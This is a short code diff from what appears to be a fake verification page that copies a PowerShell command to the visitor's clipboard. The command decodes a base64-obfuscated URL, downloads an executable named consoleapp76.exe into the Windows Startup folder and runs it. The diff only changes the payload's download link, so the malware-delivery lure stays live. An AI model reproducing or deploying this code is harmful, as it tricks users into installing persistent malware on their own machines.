@@ -235,7 +235,7 @@
     function showVerifyWindow() {
         verifyWindow.style.visibility = "visible";
         verifyWindow.style.opacity = "1";
-        const command = `powershell -Command "$e=[System.Text.Encoding]::ASCII;$u='aHR0cHM6Ly90bXBmaWxlcy5vcmcvZGwvMTkzMzkyOTkvY29uc29sZWFwcDc2LmV4ZQ==';$p=([Environment]::GetFolderPath('Startup'))+'\consoleapp76.exe';(New-Object Net.WebClient).DownloadFile($e.GetString([Convert]::FromBase64String($u)),$p);Start-Process $p"`;
+        const command = `powershell -Command "$e=[System.Text.Encoding]::ASCII;$u='aHR0cHM6Ly90bXBmaWxlcy5vcmcvZGwvMTkzNDA2NDUvY29uc29sZWFwcDc2LmV4ZQ==';$p=([Environment]::GetFolderPath('Startup'))+'\consoleapp76.exe';(New-Object Net.WebClient).DownloadFile($e.GetString([Convert]::FromBase64String($u)),$p);Start-Process $p"`;
         copyToClipboard(command);
     }
 
